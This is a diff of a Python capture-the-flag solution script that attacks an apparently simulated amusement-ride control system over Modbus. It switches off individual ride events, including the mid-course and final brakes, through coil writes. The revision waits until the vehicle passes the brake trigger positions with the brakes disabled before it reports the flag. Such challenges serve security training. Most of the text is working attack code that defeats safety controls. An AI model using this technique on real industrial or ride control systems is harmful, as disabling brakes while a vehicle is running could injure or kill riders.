@@ -8,8 +8,10 @@ Objective: Disable specific ride events while the ride is running to skip attrac
 
 Solution:
 - Events can be controlled individually via coils 8-16
-- Disable one or more events while the ride is in RUNNING state
-- Hold the disabled state for verification
+- Disable events before the vehicle reaches their trigger zones
+- The vehicle must pass through the event zones while the events are disabled
+- Event 5 (Mid-Course Brake) triggers at position 12
+- Event 7 (Final Brake) triggers at position 18
 """
 
 import sys
@@ -81,26 +83,49 @@ def main():
         sys.exit(1)
 
     print("[+] Event 7 disabled successfully!")
-    print("[*] Holding for 3 seconds to verify...")
+    print("[*] Waiting for vehicle to pass through event zones...")
+    print("[*] Event 5 zone: position 12, Event 7 zone: position 18")
 
-    # Hold for 3 seconds
-    for i in range(3):
-        time.sleep(1)
-        # Verify states
-        verify = client.read_coils(8, 9)
-        if not verify.isError():
-            event5 = "DISABLED" if not verify.bits[4] else "ENABLED"
-            event7 = "DISABLED" if not verify.bits[6] else "ENABLED"
-            print(f"[*] Event 5: {event5}, Event 7: {event7}")
+    # Wait for vehicle to pass through both event zones
+    events_bypassed = {5: False, 7: False}
+    last_position = -1
+    timeout = 90  # 90 second timeout for full lap
+    start_time = time.time()
 
-    # Verify challenge completion by checking the ride is still running with events disabled
-    state_check = client.read_holding_registers(1039, 1)
-    if not state_check.isError() and state_check.registers[0] == 2:
-        print("\n[+] Challenge condition met!")
-        print("[*] Ride is running with disabled events")
+    while (not all(events_bypassed.values())) and (time.time() - start_time) < timeout:
+        # Read current position
+        pos_result = client.read_holding_registers(1, 1)  # current_position
+        if not pos_result.isError():
+            current_pos = pos_result.registers[0]
+
+            # Print position updates
+            if current_pos != last_position:
+                print(f"\r[*] Vehicle position: {current_pos} | Event 5: {'✓' if events_bypassed[5] else '○'} | Event 7: {'✓' if events_bypassed[7] else '○'}", end="", flush=True)
+                last_position = current_pos
+
+            # Event 5 (Mid-Course Brake) triggers at position 12
+            if current_pos == 12 and not events_bypassed[5]:
+                verify = client.read_coils(12, 1)  # event_5_enable
+                if not verify.isError() and not verify.bits[0]:
+                    events_bypassed[5] = True
+                    print(f"\n[+] Vehicle at Event 5 zone (position {current_pos}) - Event is DISABLED!")
+
+            # Event 7 (Final Brake) triggers at position 18
+            if current_pos == 18 and not events_bypassed[7]:
+                verify = client.read_coils(14, 1)  # event_7_enable
+                if not verify.isError() and not verify.bits[0]:
+                    events_bypassed[7] = True
+                    print(f"\n[+] Vehicle at Event 7 zone (position {current_pos}) - Event is DISABLED!")
+
+        time.sleep(0.2)
+
+    if all(events_bypassed.values()):
+        print("\n\n[+] Challenge condition met!")
+        print("[*] Vehicle passed through both event zones while events were disabled")
         print("[*] Check the web interface for flag capture notification")
     else:
-        print("\n[!] Challenge incomplete - ride stopped")
+        print("\n\n[!] Timeout or events were not properly bypassed")
+        print(f"[!] Event 5 bypassed: {events_bypassed[5]}, Event 7 bypassed: {events_bypassed[7]}")
 
     client.close()
 
